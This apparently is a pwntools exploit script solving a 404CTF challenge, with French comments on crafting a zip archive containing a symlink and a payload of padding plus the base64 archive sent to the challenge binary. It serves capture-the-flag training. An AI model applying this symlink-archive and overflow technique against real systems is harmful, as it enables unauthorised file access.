#!/usr/bin/env python3

from pwn import *
from time import sleep
from base64 import b64encode


# Préparation :
# echo 'OKKKKKKKKKKKKKKKKK' > salle_au_tresor
# ln -s salle_au_tresor surprise.txt
# zip --symlinks test.zip surprise.txt


HOST = "challenges.404ctf.fr"
PORT = 31725

exe = ELF("./cache_cache_le_retour")

context.binary = exe.path

def conn():
    if args.REMOTE:
        r = remote(HOST, PORT)
    elif args.TRACE:
        r  = process(["strace", "-f", "-o","strace.out", exe.path])
    else:
        r = process([exe.path])
    return r


def main():

    with open('test.zip', 'rb') as fi:
        t = fi.read()
        print(len(b64encode(t)))


    global r
    r = conn()

    p = subprocess.Popen('./gen_pwd', stdout=subprocess.PIPE)
    tmp_pwd = p.communicate()[0]
    rep = r.recvuntil(b'passe ?\n')
    r.send(tmp_pwd)
    rep = r.recvuntil(b'couloir.')

    r.send(b'A'*0x27 + b64encode(t) + b'\n')
    rep = r.recv()
    print(rep.decode())
    rep = r.recv()
    print(rep.decode())

if __name__ == "__main__":
	main()
